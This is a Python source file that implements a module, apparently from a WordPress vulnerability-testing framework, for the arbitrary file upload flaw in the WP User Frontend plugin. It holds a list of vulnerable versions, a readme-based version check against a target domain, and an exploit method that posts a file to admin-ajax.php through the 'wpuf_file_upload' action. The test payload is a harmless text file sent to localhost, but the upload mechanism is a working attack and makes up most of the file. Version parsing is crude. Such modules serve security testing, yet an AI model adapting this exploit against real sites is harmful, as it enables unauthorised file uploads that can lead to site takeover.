
import requests
import tempfile
import wpexploit

class WP_User_Frontend(wpexploit.WPExploit):
        def __init__(self, domain, additional_data=None, proxies=None):
            self.domain = domain
            self.additional_data = additional_data
            self.proxies = proxies
            self.session = requests.Session()
            self.plugin_name = "WP User Frontend"
            self.vuln_plugin_versions = ["2.1","2.1.1", "2.1.2", "2.1.3", "2.1.4", "2.1.5","2.1.6","2.1.8","2.1.9","2.1.10","2.2",
                                         "2.2.1","2.2.2","2.2.3","2.2.4","2.2.5","2.2.6","2.2.7","2.3.2","2.3.3","2.3.5","2.3.6",
                                         "2.3.7","2.3.8","2.3.9","2.3.10"]


        def plugin_name(self):
            print("Plugin name: {}".format(self.plugin_name))
            return self.plugin_name

        def vulnerable_versions(self):
            print("Vulnerable versions: {}".format(self.vuln_plugin_versions))
            return self.vuln_plugin_versions

        def is_vulnerable_version(self, version_str):
            if version_str in self.vuln_plugin_versions :
                return True
            else:
                return False

        def get_references(self):
            references=dict()
            references['Description']="https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-wp-user-frontend-arbitrary-file-upload-2-3-10"
            references['Exploit']="https://www.exploit-db.com/exploits/39422"
            return references

        def is_vulnerable(self, data=None, proxies=None):
            plugin_readme = self.session.get(
                self.domain+"wp-content/plugins/wp-user-frontend-pro/readme.txt"
            ).text
            index_ver = plugin_readme.find("version")
            plugin_version = plugin_readme[index_ver+8:index_ver+13]
            print(plugin_version)
            point_index=data.find(".")
            first_ver_num = data[:point_index]
            ver_num = float(first_ver_num)
            if ver_num >= 4.0:
                if plugin_version in self.vuln_plugin_versions:
                    print("The domain is vulnerable!!!")
                    return True
                else:
                    print("The plugin version is not compatible")
                    return False
            else:
                print("The wordpress version is not compatible")
                return False


        def exploit(self, data=None, proxies=None):
            url = 'http://127.0.0.1/wordpress/wp-admin/admin-ajax.php'

            postData = {
                'action': 'wpuf_file_upload'
            }

            file = tempfile.NamedTemporaryFile(mode='a+t', suffix='.txt')

            file.write('Success')

            file.seek(0)

            files = {'wpuf_file': file}

            r = requests.post(url, data=postData, files=files)

            file.close()

            if r.text != 'error':
                print('Success!')
                print(r.text)
            else:
                print('error')






